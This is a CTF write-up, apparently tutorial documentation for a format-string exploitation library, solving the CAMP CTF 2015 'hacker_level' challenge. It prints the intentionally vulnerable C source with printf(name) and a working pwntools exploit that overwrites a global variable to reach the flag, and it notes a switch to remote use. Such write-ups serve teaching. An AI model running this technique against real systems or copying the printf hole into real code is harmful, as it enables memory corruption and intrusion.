CAMP CTF 2015: Hacker Level
###########################

********
Overview
********
hacker_level is a CTF challenge that took as input a string (presumably the
person's name) and echo'd a welcome message back. It then performed a series of
calculations on the name, which proved pointless as the final check would
always fail given those constraints.

The challenge is clearly to utilize the blatant format string vulnerability to
get to the part of the code that prints success.

Example::

  $ ./hacker_level 
  What's your name? %x
  Hello, 40
  Sorry, you're not leet enough to get the flag :(
  Your hacker level is: 0x3db5

***********
Source Code
***********
This is the source code for the challenge:

.. code-block:: c

  #include <stdio.h>
  #include <stdint.h>
  #include <unistd.h>
  
  static uint32_t level = 0;
  static void calc_level(const char *name);

  int main() {
  	char name[64] = "";

	setbuf(stdin, NULL);		// turn off buffered I/O
	setbuf(stdout, NULL);

	printf("What's your name? ");
	fgets(name, sizeof name, stdin);

	calc_level(name);

	usleep(150000);
	printf("Hello, ");
	printf(name);

	usleep(700000);
	if (level == 0xCCC31337) {
		FILE *f = fopen("flag.txt", "r");
		if (f) {
			char flag[80] = "";
			fread(flag, 1, sizeof flag, f);
			printf("The flag is: ");
			printf(flag);
			fclose(f);
		} else {
			printf("I would give you the flag, but I can't find it.\n");
		}
	} else {
		printf("Sorry, you're not leet enough to get the flag :(\n");
		usleep(400000);
		printf("Your hacker level is: 0x%x\n", level);
	}

	return 0;
  }

  static void calc_level(const char *name) {
	for (const char *p = name; *p; p++) {
		level *= 257;
		level ^= *p;
	}
	level %= 0xcafe;
  }


*****************
The Vulnerability
*****************
This program is clearly vulnerable to a format string attack. Further, to get
to the winning path it checks a global variable against the value 0xCCC31337.
Since the ``calc_level`` function mods the result to less than a word length,
this path will never hit without exploitation.


****************
Step 1: exec_fmt 
****************
The first step in using the ``FormatString`` class is to create an exec_fmt
function. This function will take in any arbitrary input, pass that input into
the application properly, parse the results and return the results back. At
this point, we're not worried about exploiting the vulnerability, we're simply
interacting with the program.

.. code-block:: python

  def exec_fmt(s,echo=False):
      #  Open up pwntool process class to interact with application
      p = process("./hacker_level",buffer_fill_size=0xffff)
      # Go ahead and send our input
      p.sendline(s)
      # Throw out data that we know to be before our results
      p.recvuntil("Hello, ",drop=True)
      # We could do better here, but why? Just grab all the rest of the data.
      out = p.recvall()
      # For diagnostic reasons, we can print out the output
      if echo:
          print(out)
      # Since we're running this every time, close out the proc.
      p.close()
      return out


That'll do. That's the majority of your work right there.


*************************
Step 2: Instantiate Class
*************************
Next, we need to instantiate a FormatString class. This can be done strait
forward. To make it simpler, we'll also open an ``ELF`` class on the exe.

.. code-block:: python

  from formatStringExploiter.FormatString import FormatString
  from pwn import *
  
  # Load the binary in pwntools. This way we don't need to worry about the
  # details, just pass it to FormatString
  elf = ELF("./hacker_level")
  
  # Now, instantiate a FormatString class, using the elf and exec_fmt functions
  fmtStr = FormatString(exec_fmt,elf=elf)

You will see some data scroll. This is the FormatString class attempting to
discover your buffer for you. Finally, you'll see something like this::

  Found the offset to our input! Index = 7, Pad = 0

Good to go now. It has found the buffer, we can simply ask the class to perform
actions for us now.

***********************
Step 3: Write the Value
***********************
We now have a functional and initialize ``FormatString`` class. We also know
from the source code that we would like the variable named "level" to be equal
to 0xCCC31337. Let's ask ``FormatString`` to do just that. In this case, we
will set the echo option to True so that we can see the output since the
application exits immediately.

.. code-block:: python

  fmtStr.write_d(elf.symbols['level'],0xCCC31337)

That's it. Your flag is printed. If this were the CTF, you could change
``process`` to ``remote`` and run it again to grab the flag.
